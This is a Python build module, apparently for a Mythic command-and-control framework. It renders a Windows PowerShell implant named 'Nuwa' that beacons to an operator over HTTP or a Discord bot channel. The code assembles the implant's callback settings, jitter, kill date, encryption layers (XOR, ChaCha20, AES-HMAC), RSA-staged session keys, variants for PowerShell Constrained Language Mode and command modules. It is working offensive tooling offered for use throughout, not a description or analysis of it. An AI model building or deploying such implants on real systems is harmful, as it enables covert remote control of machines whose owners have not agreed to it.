        rb"\bConvertTo-NuwaTransportEnvelope(?:\s|$)",
        rb"\bConvertFrom-NuwaTransportEnvelope(?:\s|$)",
        rb"\bConvertTo-NuwaBase64String(?:\s|$)",
        rb"\bConvertFrom-NuwaBase64String(?:\s|$)",
    ):
        if re.search(legacy_marker, payload) is not None:
            raise ValueError("Staged raw artifact contains legacy framing helpers")


def _decode_codec_profiles(codec_profile: str) -> tuple[str, ...]:
    """Return the one codec implementation selected for this artifact."""
    if codec_profile not in POWERSHELL_CODEC_PROFILES:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'")
    return (codec_profile,)


def _render_static_codec_dispatch_source(
    codec_profile: str,
    *,
    protected: bool = False,
) -> str:
    function_names = {
        "raw": ("ConvertTo-NuwaRawBytes", "ConvertFrom-NuwaRawBytes"),
        "base64": ("ConvertTo-NuwaRadix64Bytes", "ConvertFrom-NuwaRadix64Bytes"),
        "decimal": ("ConvertTo-NuwaDecimalBytes", "ConvertFrom-NuwaDecimalBytes"),
        "emoji": ("ConvertTo-NuwaEmojiBytes", "ConvertFrom-NuwaEmojiBytes"),
    }
    try:
        encoder, decoder = function_names[codec_profile]
    except KeyError as exc:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'") from exc
    encode_input = (
        "[byte[]](Protect-NuwaBytes -Bytes (ConvertTo-NuwaUtf8Bytes -Value $MessageJson) -Context $Context)"
        if protected
        else "[byte[]](ConvertTo-NuwaUtf8Bytes -Value $MessageJson)"
    )
    decode_input = (
        "[byte[]](Unprotect-NuwaBytes -Bytes $decodedBytes -Context $Context)"
        if protected
        else "$decodedBytes"
    )
    return f"""
function ConvertTo-NuwaInner {{
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][byte[]]$Bytes, [Parameter(Mandatory = $true)][hashtable]$Context)
    return {encoder} -Bytes $Bytes -Context $Context
}}

function ConvertFrom-NuwaInner {{
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][byte[]]$Bytes, [Parameter(Mandatory = $true)][hashtable]$Context)
    return {decoder} -Bytes $Bytes -Context $Context
}}

function ConvertTo-NuwaWireBytes {{
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][AllowEmptyString()][string]$MessageJson, [Parameter(Mandatory = $true)][hashtable]$Context)
    return ConvertTo-NuwaInner -Bytes ({encode_input}) -Context $Context
}}

function ConvertFrom-NuwaWireBytes {{
    [CmdletBinding()]
    param([Parameter(Mandatory = $true)][byte[]]$WireBytes, [Parameter(Mandatory = $true)][hashtable]$Context)
    $decodedBytes = [byte[]](ConvertFrom-NuwaInner -Bytes $WireBytes -Context $Context)
    $messageBytes = {decode_input}
    $json = ConvertFrom-NuwaUtf8Bytes -Bytes $messageBytes
    $parsed = $json | ConvertFrom-Json -ErrorAction Stop
    if ($null -eq $parsed -or -not $json.Trim().StartsWith('{{')) {{ throw 'Nuwa wire message must be a JSON object' }}
    return [string]$json
}}
""".strip() + "\n"


def _codec_source_path(codec_profile: str, powershell_runtime: str) -> pathlib.Path:
    runtime = _coerce_powershell_runtime(powershell_runtime)
    if codec_profile == "base64" and runtime == POWERSHELL_RUNTIME_CONSTRAINED:
        return CLM_CODEC_ROOT / "base64.ps1"
    return CODEC_ROOT / f"{codec_profile}.ps1"


def _base_config(
    *,
    payload_uuid: str,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    codec_profile: str,
    debug_logging: bool,
    framing_mode: str,
) -> dict[str, Any]:
    config = {
        "PayloadUUID": payload_uuid,
        "C2Profile": c2_profile_name,
        "CallbackInterval": int(c2_parameters.get("callback_interval", 3)),
        "CallbackJitter": int(c2_parameters.get("callback_jitter", 30)),
        "ProxyHost": str(c2_parameters.get("proxy_host", "")),
        "ProxyPort": str(c2_parameters.get("proxy_port", "")),
        "Killdate": str(c2_parameters.get("killdate", "")),
        "CodecProfile": codec_profile,
        "DebugLogging": bool(debug_logging),
        "MessageUuidLength": 36,
    }
    if framing_mode == "legacy":
        config["ProxyUser"] = str(c2_parameters.get("proxy_user", ""))
        config["ProxyPass"] = str(c2_parameters.get("proxy_pass", ""))
    return config


def _profile_config(c2_profile_name: str, c2_parameters: dict[str, Any]) -> dict[str, Any]:
    if c2_profile_name == "http":
        return {
            "CallbackHost": str(c2_parameters.get("callback_host", "")),
            "CallbackPort": str(c2_parameters.get("callback_port", "80")),
            "PostUri": str(c2_parameters.get("post_uri", "")),
            "Headers": dict(c2_parameters.get("headers", {})),
        }
    if c2_profile_name == "discordx":
        return {
            "DiscordToken": str(c2_parameters.get("discord_token", "")),
            "BotChannel": str(c2_parameters.get("bot_channel", "")),
            "MessageChecks": int(c2_parameters.get("message_checks", 10)),
            "TimeBetweenChecks": int(c2_parameters.get("time_between_checks", 10)),
        }
    raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")


def _transport_envelope_source_paths(
    selection: TransportEnvelopeSelection,
    powershell_runtime: str,
    c2_profile_name: str,
    framing_mode: str,
) -> tuple[pathlib.Path, ...]:
    if not selection.enabled:
        return ()
    runtime = _coerce_powershell_runtime(powershell_runtime)
    paths: list[pathlib.Path] = [
        TRANSPORT_ENVELOPE_ROOT / (
            "discord_functions.ps1" if c2_profile_name == "discordx" else "functions.ps1"
        )
    ]
    if c2_profile_name == "discordx":
        paths.append(TRANSPORT_ENVELOPE_FORMAT_ROOT / f"{selection.envelope_format}.ps1")
        paths.append(TRANSPORT_ENVELOPE_FRAMING_ROOT / f"{framing_mode}.ps1")

    if selection.protection != "none":
        if selection.key_mode == "directional":
            if runtime == POWERSHELL_RUNTIME_CONSTRAINED:
                paths.extend(
                    [
                        CLM_PROTECTION_ROOT / "common.ps1",
                        CLM_PROTECTION_ROOT / "sha256.ps1",
                        TRANSPORT_ENVELOPE_KEY_MODE_ROOT / "directional_clm.ps1",
                    ]
                )
            else:
                paths.append(TRANSPORT_ENVELOPE_KEY_MODE_ROOT / "directional_full.ps1")
        else:
            paths.append(TRANSPORT_ENVELOPE_KEY_MODE_ROOT / "single.ps1")

    protection_file = {
        "none": "none.ps1",
        "xor-obfuscation-v1": "xor.ps1",
        "chacha20-v1": "chacha20.ps1",
        "aes256-hmac-v1": (
            "aes_clm.ps1"
            if runtime == POWERSHELL_RUNTIME_CONSTRAINED
            else "aes_full.ps1"
        ),
    }[selection.protection]
    if (
        selection.protection == "aes256-hmac-v1"
        and runtime == POWERSHELL_RUNTIME_CONSTRAINED
    ):
        for helper in (
            CLM_PROTECTION_ROOT / "common.ps1",
            CLM_PROTECTION_ROOT / "sha256.ps1",
            CLM_PROTECTION_ROOT / "aes256.ps1",
        ):
            if helper not in paths:
                paths.append(helper)
    presentation_path = TRANSPORT_ENVELOPE_PRESENTATION_ROOT / f"{selection.presentation}.ps1"
    if (
        selection.presentation == "base64"
        and runtime == POWERSHELL_RUNTIME_CONSTRAINED
    ):
        presentation_path = (
            TRANSPORT_ENVELOPE_PRESENTATION_ROOT / "clm" / "base64.ps1"
        )
    paths.extend(
        [
            TRANSPORT_ENVELOPE_PROTECTION_ROOT / protection_file,
            presentation_path,
        ]
    )
    for path in paths:
        if not path.is_file():
            raise ValueError(f"Missing transport-envelope source '{path.name}'")
    return tuple(paths)


def _apply_transport_envelope_config(
    config: dict[str, Any],
    selection: TransportEnvelopeSelection,
) -> None:
    if not selection.enabled:
        return
    config["TransportEnvelopeEnabled"] = True
    config["TransportEnvelopeFormat"] = selection.envelope_format
    config["TransportPresentation"] = selection.presentation
    config["TransportProtection"] = selection.protection
    config["TransportKeyMode"] = selection.key_mode
    if selection.nonce_strategy is not None:
        config["TransportNonceStrategy"] = selection.nonce_strategy


def _render_transport_envelope_state(selection: TransportEnvelopeSelection) -> str:
    if selection.key is None:
        return '@{ "MasterKey" = $null }'
    return "@{ \"MasterKey\" = " + _ps_byte_array(selection.key) + " }"


def _profile_framing_source_path(
    c2_profile_name: str,
    framing_mode: str,
    selection: TransportEnvelopeSelection,
) -> pathlib.Path:
    if c2_profile_name == "http" and selection.enabled:
        return TRANSPORT_ENVELOPE_CARRIER_ROOT / f"http_{framing_mode}.ps1"
    return PROFILE_ROOT / c2_profile_name / "framing" / framing_mode / "functions.ps1"


def _render_profile_transport_source(
    c2_profile_name: str,
    selection: TransportEnvelopeSelection,
) -> str:
    source = _read_text(PROFILE_ROOT / c2_profile_name / "transport.ps1")
    fixed_regions = {
        "discordx": (
            (
                "# NUWA_DISCORD_FIXED_ENCODE_BEGIN\n",
                "# NUWA_DISCORD_FIXED_ENCODE_END\n",
                TRANSPORT_ENVELOPE_CARRIER_ROOT / "discord_encode.ps1",
                "fixed Discord encoder",
            ),
            (
                "# NUWA_DISCORD_FIXED_DECODE_BEGIN\n",
                "# NUWA_DISCORD_FIXED_DECODE_END\n",
                TRANSPORT_ENVELOPE_CARRIER_ROOT / "discord_decode.ps1",
                "fixed Discord decoder",
            ),
        ),
        "http": (
            (
                "# NUWA_HTTP_FIXED_TRANSPORT_BEGIN\n",
                "# NUWA_HTTP_FIXED_TRANSPORT_END\n",
                TRANSPORT_ENVELOPE_CARRIER_ROOT / "http_transport.ps1",
                "fixed HTTP transport",
            ),
        ),
    }[c2_profile_name]
    if selection.enabled:
        for fixed_begin, fixed_end, replacement_path, label in fixed_regions:
            source = _replace_marked_source_region(
                source,
                begin_marker=fixed_begin,
                end_marker=fixed_end,
                replacement=_read_text(replacement_path),
                label=label,
            )
    else:
        for fixed_begin, fixed_end, _, _ in fixed_regions:
            source = source.replace(fixed_begin, "").replace(fixed_end, "")
    begin_marker = "    # NUWA_TRANSPORT_ENVELOPE_BEGIN\n"
    end_marker = "    # NUWA_TRANSPORT_ENVELOPE_END\n"
    if not selection.enabled:
        while begin_marker in source:
            start = source.index(begin_marker)
            end = source.index(end_marker, start) + len(end_marker)
            source = source[:start] + source[end:]
        if c2_profile_name == "http":
            source = _replace_source_once(
                source,
                "    $body = New-NuwaTransportRequestBody -Uuid $Uuid -WireBody $WireBody\n}",
                "    $body = New-NuwaTransportRequestBody -Uuid $Uuid -WireBody $WireBody\n"
                "    return Invoke-NuwaHttpRequest -Body $body\n}",
                label="legacy HTTP transport return",
            )
    else:
        source = source.replace(begin_marker, "").replace(end_marker, "")
    if c2_profile_name == "discordx" and selection.enabled:
        source = _replace_source_once(
            source,
            'filename="status-server"',
            'filename="message.txt"',
            label="Discord attachment filename",
        )
    return source


def render_payload_source(
    *,
    payload_uuid: str,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    codec_profile: str,
    debug_logging: bool,
    command_names: list[str],
    powershell_runtime: str = POWERSHELL_RUNTIME_FULL,
) -> str:
    c2_profile_name = str(c2_profile_name or "").strip().lower()
    codec_profile = str(codec_profile or "").strip().lower()
    if codec_profile not in POWERSHELL_CODEC_PROFILES:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'")
    powershell_runtime = _coerce_powershell_runtime(powershell_runtime)
    transport_envelope = _resolve_transport_envelope_selection(
        c2_profile_name,
        c2_parameters,
    )
    framing_mode = _resolve_framing_mode(c2_profile_name, c2_parameters)
    if framing_mode == "raw":
        _validate_raw_parameters(c2_profile_name, c2_parameters)
    _validate_payload_compatibility(
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        framing_mode=framing_mode,
        codec_profile=codec_profile,
        protection_profile=PROTECTION_NONE,
        exchange_enabled=False,
        transport_envelope=transport_envelope,
    )

    config = _base_config(
        payload_uuid=payload_uuid,
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        codec_profile=codec_profile,
        debug_logging=debug_logging,
        framing_mode=framing_mode,
    )
    config.update(_profile_config(c2_profile_name, c2_parameters))
    config["PowerShellRuntime"] = powershell_runtime
    _apply_transport_envelope_config(config, transport_envelope)
    if transport_envelope.enabled:
        config["TransportMessageFormat"] = "raw-v1" if framing_mode == "raw" else ""

    sections = [
        "$script:NuwaConfig = " + _ps_hashtable(config),
        "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
        _read_text(BASE_CODE_ROOT / "utf8.ps1"),
    ]
    if transport_envelope.enabled:
        sections.insert(
            2,
            "$script:NuwaTransportEnvelopeState = "
            + _render_transport_envelope_state(transport_envelope),
        )
    if framing_mode == "legacy":
        sections.extend(
            [
                _read_text(BASE_CODE_ROOT / "base64.ps1"),
                _read_text(BASE_CODE_ROOT / "transport.ps1"),
            ]
        )
    sections.extend(
        [
            _read_text(FRAMING_ROOT / framing_mode / "functions.ps1"),
            _read_text(
                _profile_framing_source_path(
                    c2_profile_name,
                    framing_mode,
                    transport_envelope,
                )
            ),
            _read_text(BASE_CODE_ROOT / "runtime_helpers.ps1"),
            _render_static_codec_dispatch_source(codec_profile),
        ]
    )
    for decoder_profile in _decode_codec_profiles(codec_profile):
        sections.append(
            _read_text(_codec_source_path(decoder_profile, powershell_runtime))
        )
    if transport_envelope.enabled:
        sections.extend(
            _read_text(path)
            for path in _transport_envelope_source_paths(
                transport_envelope,
                powershell_runtime,
                c2_profile_name,
                framing_mode,
            )
        )
    sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope))

    selected_commands = list(dict.fromkeys(command_names or DEFAULT_COMMANDS))
    for dependency in ("hostname", "whoami"):
        if dependency not in selected_commands:
            selected_commands.insert(0, dependency)
    for command_name in selected_commands:
        command_path = COMMAND_ROOT / f"{command_name}.ps1"
        if command_path.exists():
            sections.append(_read_text(command_path))

    agent_main_source = _read_text(BASE_CODE_ROOT / "agent_main.ps1")
    if c2_profile_name == "discordx" and transport_envelope.enabled:
        agent_main_source = _render_discord_byte_agent_main_source(agent_main_source)
    sections.append(agent_main_source)
    rendered_source = "\n\n".join(sections) + "\n"
    base64_selected = (
        codec_profile == "base64" or transport_envelope.presentation == "base64"
    )
    if framing_mode == "raw" and not base64_selected:
        _validate_raw_artifact(rendered_source.encode("utf-8"))
    return rendered_source


def render_protected_payload_source(
    *,
    payload_uuid: str,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    codec_profile: str,
    debug_logging: bool,
    command_names: list[str],
    protection_profile: str,
    protection_key: bytes,
    powershell_runtime: str = POWERSHELL_RUNTIME_FULL,
    staging_enabled: bool = False,
) -> str:
    c2_profile_name = str(c2_profile_name or "").strip().lower()
    codec_profile = str(codec_profile or "").strip().lower()
    if codec_profile not in POWERSHELL_CODEC_PROFILES:
        raise ValueError(f"Unsupported codec profile '{codec_profile}'")
    transport_envelope = _resolve_transport_envelope_selection(
        c2_profile_name,
        c2_parameters,
    )
    protection_profile = str(protection_profile or "").strip().lower()
    if protection_profile not in PROTECTED_PROFILES:
        raise ValueError(f"Unsupported protected profile '{protection_profile}'")
    powershell_runtime = _coerce_powershell_runtime(powershell_runtime)
    if not isinstance(protection_key, bytes) or len(protection_key) != 32:
        raise ValueError("Protected payload rendering requires one 32-byte key")
    if not isinstance(staging_enabled, bool):
        raise ValueError("staging_enabled must be Boolean")
    protection_source_paths = _protection_source_paths(
        protection_profile,
        powershell_runtime,
    )

    framing_mode = _resolve_framing_mode(c2_profile_name, c2_parameters)
    if framing_mode == "raw":
        _validate_raw_parameters(c2_profile_name, c2_parameters)
    _validate_payload_compatibility(
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        framing_mode=framing_mode,
        codec_profile=codec_profile,
        protection_profile=protection_profile,
        exchange_enabled=staging_enabled,
        transport_envelope=transport_envelope,
    )

    config = _base_config(
        payload_uuid=payload_uuid,
        c2_profile_name=c2_profile_name,
        c2_parameters=c2_parameters,
        codec_profile=codec_profile,
        debug_logging=debug_logging,
        framing_mode=framing_mode,
    )
    config.update(_profile_config(c2_profile_name, c2_parameters))
    config["PowerShellRuntime"] = powershell_runtime
    _apply_transport_envelope_config(config, transport_envelope)
    if transport_envelope.enabled:
        config["TransportMessageFormat"] = "raw-v1" if framing_mode == "raw" else ""
    config["ProtectionProfile"] = protection_profile
    crypto_state = "\n".join(
        [
            "@{",
            f'    "OuterUuid" = {_ps_literal(payload_uuid)}',
            f'    "Key" = {_ps_byte_array(protection_key)}',
            "}",
        ]
    )

    sections = [
        "$script:NuwaConfig = " + _ps_hashtable(config),
        "$script:NuwaState = @{ \"CurrentDirectory\" = (Get-Location).Path; \"ExitRequested\" = $false }",
        "$script:NuwaCryptoState = " + crypto_state,
        _read_text(BASE_CODE_ROOT / "utf8.ps1"),
    ]
    if transport_envelope.enabled:
        sections.insert(
            3,
            "$script:NuwaTransportEnvelopeState = "
            + _render_transport_envelope_state(transport_envelope),
        )
    if framing_mode == "legacy":
        sections.extend(
            [
                _read_text(BASE_CODE_ROOT / "base64.ps1"),
                _read_text(BASE_CODE_ROOT / "transport.ps1"),
            ]
        )
    sections.extend(
        [
            _read_text(FRAMING_ROOT / framing_mode / "functions.ps1"),
            _read_text(
                _profile_framing_source_path(
                    c2_profile_name,
                    framing_mode,
                    transport_envelope,
                )
            ),
            _read_text(BASE_CODE_ROOT / "runtime_helpers.ps1"),
            *(_read_text(path) for path in protection_source_paths),
            _render_static_codec_dispatch_source(codec_profile, protected=True),
        ]
    )
    for decoder_profile in _decode_codec_profiles(codec_profile):
        sections.append(
            _read_text(_codec_source_path(decoder_profile, powershell_runtime))
        )
    if transport_envelope.enabled:
        sections.extend(
            _read_text(path)
            for path in _transport_envelope_source_paths(
                transport_envelope,
                powershell_runtime,
                c2_profile_name,
                framing_mode,
            )
            if path not in protection_source_paths
        )
    sections.append(_render_profile_transport_source(c2_profile_name, transport_envelope))

    selected_commands = list(dict.fromkeys(command_names or DEFAULT_COMMANDS))
    for dependency in ("hostname", "whoami"):
        if dependency not in selected_commands:
            selected_commands.insert(0, dependency)
    for command_name in selected_commands:
        command_path = COMMAND_ROOT / f"{command_name}.ps1"
        if command_path.exists():
            sections.append(_read_text(command_path))

    staging_module = ""
    if staging_enabled:
        staging_module = _read_text(_staging_source_path(powershell_runtime))
        staged_runtime = _render_staged_agent_runtime_source()
        staged_main = _read_text(STAGING_ROOT / "agent_main.ps1")
        if c2_profile_name == "discordx" and transport_envelope.enabled:
            staged_runtime = _render_discord_byte_agent_main_source(staged_runtime)
        sections.extend(
            [
                staging_module,
                staged_runtime,
                staged_main,
            ]
        )
    else:
        agent_main_source = _render_protected_agent_main_source()
        if c2_profile_name == "discordx" and transport_envelope.enabled:
            agent_main_source = _render_discord_byte_agent_main_source(agent_main_source)
        sections.append(agent_main_source)
    rendered_source = "\n\n".join(sections) + "\n"
    base64_selected = (
        codec_profile == "base64" or transport_envelope.presentation == "base64"
    )
    if framing_mode == "raw":
        rendered_bytes = rendered_source.encode("utf-8")
        if staging_enabled:
            _validate_staged_raw_artifact(
                rendered_bytes,
                staging_module.encode("utf-8"),
                allow_base64_tokens=base64_selected,
            )
        elif not base64_selected:
            _validate_raw_artifact(rendered_bytes)
    return rendered_source


class Nuwa(PayloadType):
    name = "nuwa"
    file_extension = "ps1"
    author = "@openai"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads: list[str] = []
    supports_dynamic_loading = False
    mythic_encrypts = False
    translation_container = "nuwa_translation"
    c2_profiles = ["http", "discordx"]
    message_uuid_length = 36
    note = "Windows PowerShell 5.1 agent using a translation container for custom wire encoding."
    agent_path = pathlib.Path(".") / "nuwa" / "mythic"
    agent_code_path = pathlib.Path(".") / "nuwa" / "agent_code"
    agent_icon_path = agent_path / "nuwa.svg"
    build_steps = [
        BuildStep(step_name="Render", step_description="Rendering PowerShell payload"),
    ]
    c2_parameter_deviations = {
        "http": {
            "AESPSK": C2ParameterDeviation(
                supported=True,
                choices=list(PROTECTION_CHOICES),
                default_value=PROTECTION_NONE,
            ),
            "encrypted_exchange_check": C2ParameterDeviation(
                supported=True,
                default_value=False,
            ),
        },
        "discordx": {
            "AESPSK": C2ParameterDeviation(
                supported=True,
                choices=list(PROTECTION_CHOICES),
                default_value=PROTECTION_NONE,
            ),
            "encrypted_exchange_check": C2ParameterDeviation(
                supported=True,
                choices=["T", "F"],
                default_value="F",
            ),
        },
    }
    build_parameters = [
        BuildParameter(
            name="codec_profile",
            parameter_type=BuildParameterType.ChooseOne,
            choices=list(POWERSHELL_CODEC_PROFILES),
            default_value="raw",
            description=(
                "Inner message representation. Keep raw (recommended) for compact "
                "UTF-8 JSON. With AESPSK protection, HTTP requires base64, decimal, "
                "or emoji; DiscordX json-v1 also requires one when use_base64=false, "
                "while binary-v1 can carry protected raw bytes. Outer transport "
                "presentation is separate."
            ),
        ),
        BuildParameter(
            name="debug_logging",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Enable debug output in the payload",
        ),
        BuildParameter(
            name="require_https",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="Reject HTTP callback URLs that do not use HTTPS",
        ),
        BuildParameter(
            name="powershell_runtime",
            parameter_type=BuildParameterType.ChooseOne,
            choices=list(POWERSHELL_RUNTIME_CHOICES),
            default_value=POWERSHELL_RUNTIME_FULL,
            description="Select optimized Full Language or CLM-compatible PowerShell runtime source",
        ),
    ]

    async def build(self) -> BuildResponse:
        response = BuildResponse(status=BuildStatus.Success)
        try:
            selected_c2 = _resolve_selected_c2_profile(self.c2info)
            options = _resolve_payload_options(
                c2_profile_name=selected_c2.name,
                c2_parameters=selected_c2.parameters,
                codec_profile=self.get_parameter("codec_profile"),
                debug_logging=self.get_parameter("debug_logging"),
                require_https=self.get_parameter("require_https"),
                powershell_runtime=self.get_parameter("powershell_runtime"),
                command_names=list(self.commands.get_commands()),
            )
            protection = options.protection
            powershell_runtime = options.powershell_runtime
            staging_enabled = options.staging_enabled
            render_arguments = {
                "payload_uuid": self.uuid,
                "c2_profile_name": options.c2_profile_name,
                "c2_parameters": selected_c2.parameters,
                "codec_profile": options.codec_profile,
                "debug_logging": options.debug_logging,
                "command_names": list(options.command_names),
            }
            if protection.profile == PROTECTION_NONE:
                payload_source = render_payload_source(
                    **render_arguments,
                    powershell_runtime=powershell_runtime,
                )
            else:
                if protection.key is None:  # defensive type narrowing
                    raise ValueError("Protected payload rendering requires key material")
                payload_source = render_protected_payload_source(
                    **render_arguments,
                    protection_profile=protection.profile,
                    protection_key=protection.key,
                    powershell_runtime=powershell_runtime,
                    staging_enabled=staging_enabled,
                )
            response.payload = payload_source.encode("utf-8")
            if protection.profile == PROTECTION_NONE:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload using "
                    f"{powershell_runtime} runtime source"
                )
            elif staging_enabled:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload with staged RSA "
                    f"session keys using {powershell_runtime} runtime source"
                )
            elif powershell_runtime == POWERSHELL_RUNTIME_CONSTRAINED:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload with "
                    "constrained-language runtime source and CLM-compatible "
                    "static protection"
                )
            else:
                response.build_message = (
                    "Successfully built Nuwa PowerShell payload using full-language "
                    "runtime source; protected profiles require Windows PowerShell "
                    "Full Language Mode"
                )
        except Exception as exc:  # pragma: no cover - exercised in integration
            response.set_status(BuildStatus.Error)
            response.build_stderr = str(exc)
        return response


__all__ = [
    "BuildParameter",
    "BuildParameterType",
    "BuildResponse",
    "BuildStatus",
    "C2ParameterDeviation",
    "InvalidPayloadOptions",
    "Nuwa",
    "PayloadOptionSelection",
    "CLM_CODEC_ROOT",
    "HTTP_TRANSPORT_PRESENTATIONS",
    "POWERSHELL_CODEC_PROFILES",
    "PROTECTED_PROFILES",
    "PROTECTION_AES256_HMAC_V1",
    "PROTECTION_CHOICES",
    "PROTECTION_HMAC_SHA256_V1",
    "PROTECTION_NONE",
    "PROTECTION_XOR_V1",
    "POWERSHELL_RUNTIME_CHOICES",
    "POWERSHELL_RUNTIME_CONSTRAINED",
    "POWERSHELL_RUNTIME_FULL",
    "PayloadType",
    "ProtectionSelection",
    "TransportEnvelopeSelection",
    "SupportedOS",
    "_coerce_powershell_runtime",
    "_codec_source_path",
    "_resolve_transport_envelope_selection",
    "_protection_source_paths",
    "_staging_source_path",
    "render_protected_payload_source",
    "render_payload_source",
]
